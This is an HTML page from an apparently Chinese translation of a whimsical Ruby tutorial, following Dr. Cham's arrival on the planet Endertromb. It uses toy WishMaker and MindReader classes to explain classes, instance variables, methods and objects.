&lt;p&gt;数周之后, 他离开了 – 在那巨大的内疚的驱动下, 
在一阵轰鸣的爆炸声中, 他将自己从这颗星球上放逐到了无尽的太空中.&lt;/p&gt;

&lt;p&gt;哦, 当你读到这些文字的时候, (大概吧), 我们孤独的Dr. Cham
可能正坐在他的玻璃罐中, 迎来了漫长六年的宇宙漂流的第一次着陆. 
随着航行器不断地靠近这个新世界 – 翻滚着划过天际, 
这里是太阳风激荡的”热油锅”, 又在绚丽的极光中划开了一道口子, 
在剧烈的摇晃中, Dr. Cham朦朦胧胧地睁开了沉睡的眼睛: 
之间圆球状的大地在他面前展开了自己无边无际的画卷…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/dr.cham-2.gif&quot; alt=&quot;safe landing. amazement.&quot; title=&quot;多么惊人的着陆啊...&quot; /&gt;&lt;/p&gt;

&lt;p&gt;你所见的就是Dr. Cham在Endertromb(有”沉重散步的尽头”之意)
星球上的着陆的经历. 据我所知, 他着陆的时候恰好是当地的
“Desolate Season”(无人季节? )将要结束的时候. 
在所谓的Desolate Season里, 这片大陆上的生物将失去大脑的活性, 
他们的身体就会一点点地解体, 
变成只会哼哼叫的四分之一智能和四分之三水蒸气的没有生气的鬼魂.&lt;/p&gt;

&lt;p&gt;这个时候我就应该谦虚地指出, 我对Endertromb星球上的历史, 
气候的了解是来自于我女儿的管风琴老师的 – 他出生在那个星球上.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/elderly-3.gif&quot; alt=&quot;dead husband could destory doctors&quot; title=&quot;她死去的丈夫没准可以毁灭那医生&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我曾经常常因为我女儿的管风琴老师没法合理地履行我们的合约而指责他,
希望他至少能够在零星的时间里为我接听一下紧急的家庭电话. 
后来他终于自曝了: 跑过来跟我说自己是个外星人. 
他们在白天有五百四十个小时是清醒的. 于是我就高兴地接受了, 
和他签订了一个持续到2060年的合约.&lt;/p&gt;

&lt;p&gt;大概持续了三天左右 – Dr. Cham是根据自己口袋里的手表来判断的, 
他穿过了一片贫瘠的平原, 空气里混杂着令人窒息的沙砾, 
黑压压的天空像是要将人闷在一个阴森森的矿井中. 但是在第三天, 
Desolate Season结束了, 所以当他终于醒来的时候, 
他发现自己的身边却是一片鲜艳的饱含露水的红色的花海, 
远方是层层叠叠的堡垒山峰.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;h1 id=&quot;caring-for-you-and-your-wellness&quot;&gt;Caring For You. And Your Wellness.&lt;/h1&gt;
  &lt;p&gt;&lt;em&gt;为了你的精神健康…&lt;/em&gt;&lt;/p&gt;

  &lt;p&gt;我希望在你读了大半本书之后还能有个健全的心智. 
现在我觉得你应该要来些心智训练.&lt;/p&gt;

  &lt;p&gt;首先, 先做一些深呼吸吧. 深吸一口气, 然后在心中默念
1, 2, 3, 4… 然后呼气. 你可以感觉到你自己的眼睛. 
(? You can feel your eyes. 不妨翻译成: 
闭上你的眼睛去感受它) 没错, 就是这样.&lt;/p&gt;

  &lt;p&gt;现在让我们再深吸一口气, 然后在你的脑海中想象一只河马. 
(想得快一点, 免得你被憋死… ) 想想它的四条腿, 
它皮肤上的褶皱, 它棉花糖一样的牙齿. Okay, 完成啦. 
现在呼气吧.&lt;/p&gt;

  &lt;p&gt;再一次深深地吸一口气, 然后紧紧的屏住气. 感受着胸腔中的压力, 
然后想象自己正在被这股压力压成了一只甲虫. 
其他的甲虫们被你”七十二变”的特效惊呆了, 手舞足蹈地, 
他们围在你的周围, 疯狂地摇晃着自己的触须. 哦, 不. 
但你之前还在头上顶了个苹果, 这个苹果现在正作着自由落体运动…
哐! 它砸在了这群虫子上! 你也被砸死了. 现在呼气!&lt;/p&gt;

  &lt;p&gt;再一次, 深深地吸进一口气. 然后这一次, 
想想你居住在一个所有东西都是电话磁带(telephone cords)
(这个应该是历史了吧? 合理猜测. )做成的. 
房子们是用磁带做成的; 河边上的鹅卵石, 河上的木筏
也是磁带做成的; 门廊是用磁带做成的 – 厚厚的磁带黑压压的一片, 
你只能艰难地从这磁带门中挤过去; 当夜晚来临, 你想要入眠时, 
你的床也是用磁带做成的. 没错, 就像我说的这样, 
所有东西都是磁带做成的. 甚至电话本身也是电话磁带做成的 – 
但是电话用的磁带却不是电话做成的, 它们是用面包片和小树枝做成的.&lt;/p&gt;

  &lt;p&gt;现在呼气.&lt;/p&gt;

  &lt;p&gt;然后吸气. 1, 2, 3, 4. 然后呼气.&lt;/p&gt;

  &lt;p&gt;吸一口气. 1, 2. 然后再短短地吸一口气. 3, 4. 
想象一下自己的双手啪地一下从你的手腕上跳了出来, 
冲进了你的电脑屏幕, 然后从里面开始了编程.&lt;/p&gt;

  &lt;p&gt;呼气.&lt;/p&gt;

  &lt;p&gt;深深地吸气. 你好像是搭乘着一艘潜艇深深地潜入你的体内… 
这艘潜艇还有个舌头. 好了, 呼气.&lt;/p&gt;

  &lt;p&gt;用你的鼻孔深深地吸一口气. 你的鼻子好像在放光, 
空气经过你的鼻子的过滤, 
好像是上帝将那清新自然的的空气吹入了你的胸腔. 
想象一个被孤儿们堵塞的软盘口, 它止不住的咳出孤儿们… 
与此同时, 你的肺中美妙的充满生命的上帝的吐息
却正在悄然地变成威力无比的毒药… 快一点吧, 
把这口气快呼出去吧, 然后吸入一些新的空气吧.&lt;/p&gt;

  &lt;p&gt;现在你可以醒来了. 把你游览器中的褶皱熨平吧. 
现在你可以获得一个对你自身的重整, 
并且也不要把你自己一生中的那些许许多多的冒险经历忘掉了. 
你可能不会再记得这个短短的经历. 
可能你只会记得自己曾经远远地教一只小兔子如何使用剪刀.&lt;/p&gt;

  &lt;p&gt;然后你睁开了你的眼睛, 你醒来了. 看着这段联系的开头, 
你没准像再来一次. 但是这一次, 没准你可以试试 – 
甚至连你自己的影子都是由电话磁带做成的.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;2-a-castle-has-its-computers&quot;&gt;2. A Castle Has Its Computers&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/dr.cham-3.jpg&quot; alt=&quot;the panoramic vales of Sedna on Endertromb.&quot; title=&quot;Sedna山谷的绝妙全景&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们无畏的博士穿过了花海, 走向了那座外星堡垒… 
随着脚步在地上哒哒地响起, 那座堡垒在地平线上一点又一点地升了起来.
本来他指望着周围会有些种马(? stallion), 但是放眼望去, 
完全没有任何的种马的迹象. 这个时候他就明白了, 
这个星球绝不会让他轻松地事事如意. (不会读他的心并且回应他的心愿)&lt;/p&gt;

&lt;p&gt;但是我女儿的管风琴老师却说, 这个星球&lt;strong&gt;可以读心&lt;/strong&gt;, 并且
还可以&lt;strong&gt;满足你的愿望&lt;/strong&gt; – 只是没法同时做到这件事情.&lt;/p&gt;

&lt;p&gt;有一天我问他(就是那个管风琴老师)的时候, 
他在一张纸上写下了下面的代码 – 这张纸有着奶酪样的颜色, 
但不知怎么的, 我觉得甚至还有一种奶酪样的气味.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'endertromb'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WishMaker&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@energy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;grant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wish&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ArgumentError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Bad wish.&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@energy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;zero?&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;No energy left.&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@energy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;Endertromb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wish&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的就是wish maker(愿望实现者).&lt;/p&gt;

&lt;p&gt;呃, 实际上来说, 这是&lt;strong&gt;wish maker的定义&lt;/strong&gt;. 
对于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;来说, 这就是一个&lt;strong&gt;类的定义&lt;/strong&gt;. 
这样的代码就会向计算机说明特定类型的&lt;strong&gt;对象&lt;/strong&gt;是如何工作的.&lt;/p&gt;

&lt;p&gt;每个早上, wish maker就会开始实现最多五个许下的愿望. 
也就是说, 随着太阳升起, 一个新的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WishMaker&lt;/code&gt;对象就会被创建.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;todays_wishes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WishMaker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中类方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new&lt;/code&gt;会创建一个新的空白的对象(&lt;strong&gt;object&lt;/strong&gt;). 
然后它会自动地去调用对象的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt;方法, 而在这里, 
正如你所见到的, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WishMaker&lt;/code&gt;类的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt;
方法里面只有一句简单的代码: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@energy = rand( 6 )&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;这里的这个具有随机值的变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@energy&lt;/code&gt;就是传说中的实例变量, 
(&lt;strong&gt;instance variable&lt;/strong&gt;). 这个实例变量在这个类的任何地方, 
任何时候都是有效的. 但是一旦到了外头(outside the scope 
of the class), 就没办法用了.&lt;/p&gt;

&lt;p&gt;在第三章中, 我们简要的讲到了实例变量, 并且将他们视为属性, 
(respect them as &lt;strong&gt;attributes&lt;/strong&gt;, 就是假如你不深究的话, 
可以把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;符号看作是”属性”的意思. ). 虽然, 
实例变量可以用来存放任何的数据信息, 但是通常情况下, 
它们都是用来存放一些代表一个类的对象的信息.&lt;/p&gt;

&lt;p&gt;在上面的例子里, 每一天的wish maker都有自己的能量槽(energy 
level). 你可以把它想象成一台机器, 上面有一个仪表盘, 
仪表盘的指针就正好指向着它自己的能量槽值. 我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@energy&lt;/code&gt;
变量的作用就像是这个仪表盘的指针一样.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;todays_wishes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WishMaker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;todays_wished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;grant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;antlers&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# antlers : 鹿角&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;好的, 现在我们回过头来再看看, 确保你自己把上面的例子搞懂了. 
我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WishMaker&lt;/code&gt;的类就是我们的魔法如何实现的大纲了. 
当然了, 这个并不是完完全全的真正的代码, 有很多的东西都被隐藏在背后. 
(因为你真的直接扔到ruby里面运行的话, 显然是不可以运行的, 
ruby会用像是看中二病一样的眼神看着你, 然后说, 啊, 
我不知道什么是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endertromb&lt;/code&gt;, 对不起, 噗. )
但是我要说, 虽然我们不能告诉电脑如何像精灵一样实现我们的愿望, 
但是我们可以让电脑去告诉小精灵如何实现我们的愿望 – 
只要你准备好了那些书面文件, 因为精灵们就好那一口.&lt;/p&gt;

&lt;p&gt;首先, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;todays_wishes&lt;/code&gt;就是创建了一个小精灵的实例, 
然后我们向它许了一个愿望, 给我们一个鹿角. 
(我绝对不想听到什么你通过这个例子得到了一个鹿角什么的, 
假如你真的得到了的话, 那么就快到草地上欢呼雀跃吧. 
你的美梦成真了. )&lt;/p&gt;

&lt;p&gt;上面的代码里面由两个部分组成:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;定义了一些东西&lt;/li&gt;
  &lt;li&gt;对这些东西施加操作(Putting those things into action.)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;什么是ruby中的&lt;strong&gt;action&lt;/strong&gt;(操作)? 就是我们的&lt;strong&gt;Methods&lt;/strong&gt;(方法). 
也许你现在对ruby语言中的这个定义还有一点点懵. 那么简单地介绍一下吧: 
我们可以用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def&lt;/code&gt;来定义方法, 用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class&lt;/code&gt;来定义类.&lt;/p&gt;

&lt;p&gt;在这一点上, 没准是时候告诉你了: 
&lt;strong&gt;在ruby里, 所有东西都是对象&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;next&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;# prints '6'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;phrase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wishing for antlers'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;                 &lt;span class=&quot;c1&quot;&gt;# prints '19'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;todays_wishes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WishMaker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;todays_wishes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;grant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;antlers&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以, 必然的, 每个对象的背后都有一个对应的对象的类.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;                       &lt;span class=&quot;c1&quot;&gt;# prints 'Integer'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wishing for antlers'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# prints 'String'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WishMaker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;# prints 'WishMaker'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dr. Cham没能够在那大平原上看到什么wish maker的踪迹, 
这是因为wish makers都待在距离他现在所在的这个平原很远的Sedna峡谷里. 
在那个陡峭的山谷里, 沿着峭壁向下, 就是一片灌木林. 
当你到了那个地方了之后, 你需要把自己的愿望写在一张小小的纸上
(written on a small 1” x 6” slip), 然后卷成一小卷, 
然后从山谷顶上扔下去 – 希望运气好的话, 它能够落到一只蜥蜴的背上, 
正好落到它小小的, 细长的角上.&lt;/p&gt;

&lt;p&gt;比方说你的愿望真的完成了这般的壮举. 好吧, 那么可惜的是, 
在那扭曲的灌木丛中的, 那些火蜥蜴, 它们尖叫着在灌木丛中赛跑, 
踏过那些腐烂的木头 – 这些宝贵的木头在很久以前还是一座教堂, 
屹立在峡谷的边缘上, 但是在一次火蜥蜴的赛跑中, 被不小心&lt;strong&gt;推倒了&lt;/strong&gt;, 
然后对于那些在教堂里头的那&lt;em&gt;饱经沧桑&lt;/em&gt;的神父, 自然不用说, 
对那些该死的恼人的两栖动物深恶痛绝到了极点, 
一定会用他那被祝福了的神圣的金链子活活勒死那些怪物们, 
然后将它们留作自己的一年一度的&lt;em&gt;Getting To Know You&lt;/em&gt;早餐来吃. 
然后… (哦, 不! ) 神父踩到了你珍贵的愿望纸条! 
你的纸条恰好被卡在了鞋子的花纹里面. 
然后更惨的是, &lt;strong&gt;盗贼们来了&lt;/strong&gt;! 这些盗贼们最爱对他人&lt;strong&gt;施加酷刑&lt;/strong&gt;, 
他们拿着利刃威逼, 一寸一寸地从头到脚地剥夺神父身上的财宝 – 
谁能够顶得住这样的酷刑呢? 
然后当(可怜的)神父终于只剩下那一双薄薄的皮鞋时, 
贪婪的盗贼们仍然不肯放过他, 
他们将这珍贵的&lt;strong&gt;牛皮鞋&lt;/strong&gt;捧在手中, 欢呼祝福自己的好运气. 
然后在欢呼庆祝完毕后, 这些盗贼轻轻地划着自己的笨重的&lt;strong&gt;独木舟&lt;/strong&gt; – 
这些独木舟上装满了财宝, 沉得几乎都要随时沉没了. 
他们兴奋地有些飘飘然了, 关掉了船上的发动机, 
在平静的水流中慢慢地划着自己的小船. 
但是你的愿望纸条的奇幻之旅并没有到此结束, 它现在卡在鞋底上, 
而这鞋子却是被随意地松松垮垮地挂在一个盗贼的腰带上的. 
突然之间, 一条&lt;strong&gt;毛茸茸的鲤鱼&lt;/strong&gt;从水中一跃而出, 
好巧不巧地撞到了那双鞋上 – 一口吞了下去. 
哼, 就让那些盗贼们慌张吧, 慌张有什么用呢? 
他们又不能够追着那只鞋子冲进水中. 假如他们能够做到的话, 
没准他们可以看到海底的数千万根光纤交织形成的海底电缆. 
等等, 那条鱼在哪里? 哦, 
那条鱼现在正&lt;strong&gt;卡&lt;/strong&gt;在这Endertromb星球的核心的&lt;strong&gt;外围&lt;/strong&gt; – 
然后这个核心所做的就是一口将那条鱼&lt;strong&gt;吞入&lt;/strong&gt;自己的内部, 
然后你的愿望纸条&lt;strong&gt;才最终到了它的最终归宿之中&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;And let’s say your wish makes it that far. 
Well, then, down the twisted wood goes the skinny salamander, 
scurrying through the decaying churches 
which had been pushed over that steep canyon ledge once 
and for all. And the expired priest inside, 
who weathered the fall as well, 
will kill the little amphibian — strangle it to death 
with a blessed gold chain — and save it for the annual 
Getting To Know You breakfast. 
He’ll step on your precious little wish and, 
when the thieves come, that slip will still be there, 
stuck on his sole. Of course, the thieves’ preferred method of 
torture is to cut a priest in thin deli-shaved slices from top 
to bottom. Who can cull evidence from that? 
And when they chop that last thin slice of shoe sole, 
they’ll have that rubber scalp in hand for good luck 
and good times. But they canoe much too hard, these thieves. 
They slap their paddles swiftly in the current to get that 
great outboard motor mist going. But the shoe sole is on 
a weak chain, tied to one man’s belt. And a hairy old carp leaps, 
latches on to that minute fraction of footwear. 
And the thieves can try, but they don’t see underwater. 
If they could, they’d see that mighty cable, 
packed with millions of needly fiber optics. 
Indeed, that fish is a peripheral plugged right 
into the core workings of the planet Endertromb. 
All it takes is one swallow from that fish 
and your wish is home free!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;嗯, 这就是孩子们的愿望是如何成真的(艰辛之路).&lt;/p&gt;

&lt;p&gt;在我女儿的管风琴老师讲完了有关wish maker的故事后, 
他有讲起了有关这个星球的mind reader的事情.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'endertromb'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MindReader&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@minds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Endertromb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scan_for_sentience&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@minds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;collect&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;mind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;就像你之前看到的那些东西一样, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt; 方法将会在一个新的
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MindReader&lt;/code&gt; 类的对象被创建的时候被调用. 
这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt;方法将会收集扫描这个星球上的思念体的意识. 
看起来这些思念体好像是被储存在一个数组中的, 
因为接下来他们将会通过一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;collect&lt;/code&gt;方法经过递归来处理.&lt;/p&gt;

&lt;p&gt;在上面的故事里, 
wish maker和mind reader都用到了一个叫做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Endertromb&lt;/code&gt;的类. 
这个类是通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require 'endertromb'&lt;/code&gt;这条命令, 
来从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endertromb.rb&lt;/code&gt;文件里面调用的.
实际上, 这个文件里面就恰好定义了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Endertromb&lt;/code&gt;的类的东西. 
通常的, 你需要调用其他的类来完成你的程序. 
接下来这本书的部分将要探索很多有趣的ruby中可以导入的类.&lt;/p&gt;

&lt;p&gt;(注: 大概是因为why没有写完就消失了的原因, 
这本书没有完全写完一开始想要讲的东西. )&lt;/p&gt;

&lt;h3 id=&quot;dr-cham-ventures-inside&quot;&gt;Dr. Cham Ventures Inside&lt;/h3&gt;
&lt;p&gt;Dr. Cham慢慢地走近了那个城堡, 因为我们之前说了, 
这个星球是一个可以读心的星球, 所以他的所有内心活动, 
他迈出的每一步, 都正被这颗星球所感知 – 心如死灰的感情. 
他沉重地踏上了大门前的台阶, 
然后穿过了入口的那曾经漂亮的拱门 – 
现在却破旧得好像是在大声哭诉自己被遗弃的命运.&lt;/p&gt;

&lt;p&gt;Dr. Cham站在门口, 沉默的风儿拍打在他的面颊上, 
终于, 他敲开了门.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/castle-1.jpg&quot; alt=&quot;blocky whale greeting&quot; title=&quot;像素鲸的问候&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看着那只鲸鱼慢慢地鼓得像只气球一样地浮起来, 
Dr. Cham顿时感到了一丝庆幸, 还好不是一只张牙舞爪, 
迫不及待地想要和自己玩耍的巨鹰来开门; 也幸好, 
从门口中探出的不是一只巨大的老鼠的脑袋; 
或者是什么一人大小的龙卷风. 只是一只笨拙的鲸鱼罢了.&lt;/p&gt;

